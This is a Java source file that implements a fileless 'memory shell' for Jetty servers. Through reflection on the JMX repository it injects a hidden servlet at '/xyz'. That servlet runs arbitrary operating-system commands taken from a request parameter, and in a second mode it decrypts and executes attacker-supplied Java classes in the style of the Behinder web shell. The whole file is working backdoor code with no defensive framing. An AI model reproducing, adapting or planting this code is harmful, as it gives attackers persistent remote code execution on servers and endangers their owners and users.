package com.memshell.jetty;

import com.sun.jmx.mbeanserver.JmxMBeanServer;
import com.sun.jmx.mbeanserver.NamedObject;
import com.sun.jmx.mbeanserver.Repository;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.management.ObjectName;
import javax.servlet.*;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.management.ManagementFactory;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.util.Scanner;
import java.util.Set;
import java.util.UUID;

public class ServletBasedWithoutRequest extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
        // 不管是这种方式拿到的 webAppContext 还是是通过 req.getServletContext() 拿到的 webAppContext
        // 他们的类加载器都是 startJarLoader，不同于 Thread.currentThread().getContextClassLoader()
        // 导致只能通过反射的方式完成整个步骤，否则就会抛 ClassNotFoundException 异常

        try{
            String servletName = "myServlet";
            String urlPattern = "/xyz";
            final String password = "pass";

            JmxMBeanServer mBeanServer = (JmxMBeanServer) ManagementFactory.getPlatformMBeanServer();

            Field field = mBeanServer.getClass().getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            Object obj = field.get(mBeanServer);

            field = obj.getClass().getDeclaredField("repository");
            field.setAccessible(true);
            Field modifier = field.getClass().getDeclaredField("modifiers");
            modifier.setAccessible(true);
            modifier.setInt(field, field.getModifiers() & ~Modifier.FINAL);
            Repository repository = (Repository)field.get(obj);

            Set<NamedObject> namedObjectSet = repository.query(new ObjectName("org.eclipse.jetty.webapp:type=webappcontext,*"), null);
            for(NamedObject namedObject : namedObjectSet){
                field = namedObject.getObject().getClass().getSuperclass().getSuperclass().getDeclaredField("_managed");
                field.setAccessible(true);
                modifier.setInt(field, field.getModifiers() & ~Modifier.FINAL);
                Object webAppContext = field.get(namedObject.getObject());

                field = webAppContext.getClass().getSuperclass().getDeclaredField("_servletHandler");
                field.setAccessible(true);
                Object handler = field.get(webAppContext);

                field = handler.getClass().getDeclaredField("_servlets");
                field.setAccessible(true);
                Object[] objects = (Object[]) field.get(handler);

                boolean flag = false;
                for(Object o : objects){
                    field = o.getClass().getSuperclass().getDeclaredField("_name");
                    field.setAccessible(true);
                    String name = (String)field.get(o);
                    if(name.equals(servletName)){
                        flag = true;
                        break;
                    }
                }

                if(!flag){
                    System.out.println("[+] Add Dynamic Servlet");

                    ClassLoader classLoader = handler.getClass().getClassLoader();
                    Class sourceClazz = null;
                    Object holder = null;
                    try{
                        sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.Source");
                        field = sourceClazz.getDeclaredField("JAVAX_API");
                        modifier.setInt(field, field.getModifiers() & ~Modifier.FINAL);
                        Method method = handler.getClass().getMethod("newServletHolder", sourceClazz);
                        holder = method.invoke(handler, field.get(null));
                    }catch(ClassNotFoundException e){
                        sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.BaseHolder$Source");
                        Method method = handler.getClass().getMethod("newServletHolder", sourceClazz);
                        holder = method.invoke(handler, Enum.valueOf(sourceClazz, "JAVAX_API"));
                    }

                    holder.getClass().getMethod("setName", String.class).invoke(holder, servletName);
                    Servlet servlet = new HttpServlet() {
                        @Override
                        protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {
                            doGet(request, response);
                        }

                        @Override
                        protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
                            System.out.println("[+] Dynamic Servlet says hello");

                            String type = request.getParameter("type");
                            if(type != null && type.equals("basic")){
                                String cmd = request.getParameter(password);
                                if(cmd != null && !cmd.isEmpty()){
                                    String result = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
                                    response.getWriter().println(result);
                                }
                            }else if(type != null && type.equals("behinder")){
                                try{
                                    if(request.getParameter(password) != null){
                                        String key = ("" + UUID.randomUUID()).replace("-","").substring(16);
                                        request.getSession().setAttribute("u", key);
                                        response.getWriter().print(key);
                                        return;
                                    }

                                    Cipher cipher = Cipher.getInstance("AES");
                                    cipher.init(2, new SecretKeySpec((request.getSession().getAttribute("u") + "").getBytes(), "AES"));
                                    byte[] evilClassBytes = cipher.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
                                    Class evilClass = new U(this.getClass().getClassLoader()).g(evilClassBytes);
                                    Object evilObject = evilClass.newInstance();
                                    Method targetMethod = evilClass.getDeclaredMethod("equals", new Class[]{ServletRequest.class, ServletResponse.class});
                                    targetMethod.invoke(evilObject, new Object[]{request, response});
                                }catch(Exception e){
                                    e.printStackTrace();
                                }
                            }
                        }

                        class U extends ClassLoader{
                            U(ClassLoader c){super(c);}

                            public Class g(byte []b){return super.defineClass(b,0,b.length);}
                        }
                    };

                    holder.getClass().getMethod("setServlet", Servlet.class).invoke(holder, servlet);
                    handler.getClass().getMethod("addServlet", holder.getClass()).invoke(handler, holder);

//                    ServletMapping mappingx = new ServletMapping(Source.JAVAX_API);
//                    mappingx.setServletName(ServletHolder.this.getName());
//                    mappingx.setPathSpecs(urlPatterns);
//                    ServletHolder.this.getServletHandler().addServletMapping(mappingx);

                    Class clazz = classLoader.loadClass("org.eclipse.jetty.servlet.ServletMapping");
                    Object servletMapping = null;
                    try{
                        servletMapping = clazz.getDeclaredConstructor(sourceClazz).newInstance(field.get(null));
                    }catch(NoSuchMethodException e){
                        servletMapping = clazz.newInstance();
                    }

                    servletMapping.getClass().getMethod("setServletName", String.class).invoke(servletMapping, servletName);
                    servletMapping.getClass().getMethod("setPathSpecs", String[].class).invoke(servletMapping, new Object[]{new String[]{urlPattern}});
                    handler.getClass().getMethod("addServletMapping", clazz).invoke(handler, servletMapping);
                }
            }
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}
